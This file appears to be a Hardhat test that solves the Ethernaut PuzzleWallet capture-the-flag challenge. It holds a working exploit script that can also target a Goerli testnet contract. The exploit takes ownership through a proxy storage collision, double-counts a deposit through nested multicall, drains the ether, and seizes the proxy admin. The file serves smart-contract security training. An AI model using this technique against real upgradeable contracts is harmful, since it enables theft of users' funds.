const { ethers } = require('hardhat');
const { expect } = require('chai');
const ether = require('openzeppelin-test-helpers/src/ether');

describe('[Challenge] PuzzleWallet', function () {

    let deployer, attacker;
    
    before(async () =>{
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        const network = await ethers.provider.getNetwork();
        const chainID = network.chainId
        
        if (chainID == 5){ // goerli testnet
            /** connect to Dapp in goerli **/
            [attacker] = await ethers.getSigners();
            const PuzzleProxyContractFactory = await ethers.getContractFactory('PuzzleProxy');
            const PuzzleWalletContractFactory = await ethers.getContractFactory('PuzzleWallet')
            this.target = PuzzleProxyContractFactory.attach("0xeaEFEAFd7D5EDCFAB299d5101ceb872A38759399");
            let implementationAddress = await ethers.provider.getStorageAt(
                this.target.address, 
                "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
            );
            this.implement = PuzzleWalletContractFactory.attach(implementationAddress);
            this.targetImplementation = PuzzleWalletContractFactory.attach(this.target.address);
        } else { // local network - hardhat  
            /** local test **/
            [deployer, attacker] = await ethers.getSigners();
            const PuzzleProxyContractFactory = await ethers.getContractFactory('PuzzleProxy', deployer);
            const PuzzleWalletContractFactory = await ethers.getContractFactory('PuzzleWallet', deployer);
            this.implement = await PuzzleWalletContractFactory.deploy();
            let ABI = ["function init(uint256 _maxBalance)"];
            let iface = new ethers.utils.Interface(ABI);
            let data = iface.encodeFunctionData("init", [ethers.utils.parseEther("1", "ether")]);
            this.target = await PuzzleProxyContractFactory.deploy(deployer.address, this.implement.address, data);
            this.target.proposeNewAdmin(deployer.address);
            this.targetImplementation = PuzzleWalletContractFactory.attach(this.target.address);
            await this.targetImplementation.addToWhitelist(deployer.address);
            await this.targetImplementation.deposit({value:ethers.utils.parseEther("0.001", "ether")});
        }
    });

    it('Exploit', async () => {
        /** CODE YOUR EXPLOIT HERE */
        console.log(`\t [Info]`);
        console.log(`\t Proxy          : ${this.target.address}`);
        console.log(`\t Implementation : ${this.implement.address}`);
        console.log(`\t Attcker        : ${attacker.address}`);

        console.log(`\n\t [Proxy storage]`);
        console.log(`\t pendingAdmin: ${await this.target.pendingAdmin()}`);
        console.log(`\t admin       : ${await this.target.admin()}`);

        console.log(`\t [Implementation storage]`);
        console.log(`\t owner       : ${await this.targetImplementation.owner()}`);// same location as pendingAdmin
        let maxBalance = await this.targetImplementation.maxBalance()
        console.log(`\t maxBalance  : ${ethers.utils.hexlify(maxBalance)}`); // same location as admin
        console.log(`\t maxBalance  : ${ethers.utils.formatEther(maxBalance)} ether`);                       // same location as admin

        console.log(`\n\t [Before exploit]`);
        console.log(`\t contract balance: ${ethers.utils.formatEther(await ethers.provider.getBalance(this.target.address))} ether`);
        console.log(`\t Is whitelisted: ${await this.targetImplementation.whitelisted(attacker.address)}`);

        console.log(`\n\t [Exploit]`);
        console.log(`\t changing owner by executing proposeNewAdmin()...`);
        let getOwnerTX = await this.target.connect(attacker).proposeNewAdmin(attacker.address); await getOwnerTX.wait(); // change owner to attacker
        console.log(`\t owner : ${await this.targetImplementation.owner()}`);
        console.log(`\t adding attacker to whitelist...`);
        let addTX = await this.targetImplementation.connect(attacker).addToWhitelist(attacker.address); await addTX.wait();
        console.log(`\t Is whitelisted: ${await this.targetImplementation.whitelisted(attacker.address)}`);
        console.log(`\t draining ether...`);
        console.log(`\t attacker balance before: ${ethers.utils.formatEther(await this.targetImplementation.balances(attacker.address))} ether`);
        let ABI = ["function deposit()", "function multicall(bytes[] calldata data)"];
        let iface = new ethers.utils.Interface(ABI);
        let dataDeposit = iface.encodeFunctionData("deposit", []);
        let dataMultiCall = iface.encodeFunctionData("multicall", [[dataDeposit]]);
        let contractBalance = await ethers.provider.getBalance(this.target.address);
        let multiDepositTX = await this.targetImplementation.connect(attacker).multicall(
            [dataMultiCall, dataMultiCall], 
            {value:contractBalance}
        ); await multiDepositTX.wait();
        let attackerBalance = parseInt(await this.targetImplementation.balances(attacker.address));
        contractBalance = await ethers.provider.getBalance(this.target.address);
        console.log(`\t attacker balance after   : ${ethers.utils.formatEther(attackerBalance)} ether`);
        console.log(`\t current contract balance : ${ethers.utils.formatEther(contractBalance)} ether`);
        if (attackerBalance > contractBalance) attackerBalance = contractBalance;
        console.log(`\t withdrawing ${ethers.utils.formatEther(attackerBalance)} ether...`);
        let withdrawTX = await this.targetImplementation.connect(attacker).execute(
            attacker.address, 
            attackerBalance, 
            [],
            {gasLimit:2000000}
        ); await withdrawTX.wait();
        console.log(`\t changing admin address by executing setMaxBalance()...`);
        let setMaxBalanceTX = await this.targetImplementation.connect(attacker).setMaxBalance(attacker.address,{gasLimit:2000000}); await setMaxBalanceTX.wait();
        console.log(`\t admin : ${await this.target.admin()}`);
        console.log(`\t contract balance: ${ethers.utils.formatEther(await ethers.provider.getBalance(this.target.address))} ETH`);
    }).timeout(0);

    after(async () => {
        /** SUCCESS CONDITIONS */
        expect(await this.target.admin()).to.be.eq(attacker.address);
    });
});